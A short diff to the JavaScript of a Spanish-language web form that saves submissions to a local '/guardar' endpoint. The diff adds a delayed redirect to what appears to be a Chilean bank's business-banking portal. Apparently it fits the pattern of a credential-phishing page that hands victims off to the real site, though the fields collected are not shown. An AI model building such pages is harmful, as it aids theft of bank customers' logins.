@@ -209,7 +209,6 @@
     const form = document.getElementById('formIngreso');
     const mensaje = document.getElementById('mensaje');
     const btn = document.getElementById('btnEnviar');
-
     const API_URL = '/guardar';
 
     form.addEventListener('submit', async (e) => {
@@ -247,6 +246,9 @@
 
         if (respuesta.ok) {
           mostrarMensaje(data.mensaje || 'Hemos recibido su solicitud correctamente', 'exito');
+          setTimeout(() => {
+            window.location.href = 'https://empresas.officebanking.cl/';
+          }, 1000);
           form.reset();
         } else {
           mostrarMensaje(data.error || 'Error al guardar', 'error');
